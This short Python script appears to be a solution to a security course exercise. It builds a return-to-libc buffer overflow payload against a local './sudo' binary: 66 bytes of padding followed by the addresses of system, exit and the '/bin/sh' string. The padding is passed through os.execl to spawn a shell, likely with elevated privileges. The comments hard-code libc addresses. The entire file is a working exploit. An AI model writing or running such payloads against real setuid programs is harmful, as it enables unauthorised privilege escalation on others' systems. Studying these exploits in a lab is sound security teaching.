import os, sys
import addresses


PATH_TO_SUDO = './sudo'

#0xb7c5bda0 sys   \xa0\xbd\xc5\xb7'
#0xb7c4f9d0 exit	'\xd0\xf9\xc4\xb7'
#x0b\xca\xd7\xb7' /bin/sh
def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    return 'A'*66+addresses.address_to_bytes(addresses.SYSTEM)+addresses.address_to_bytes(addresses.EXIT)+addresses.address_to_bytes(addresses.LIBC_BIN_SH)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
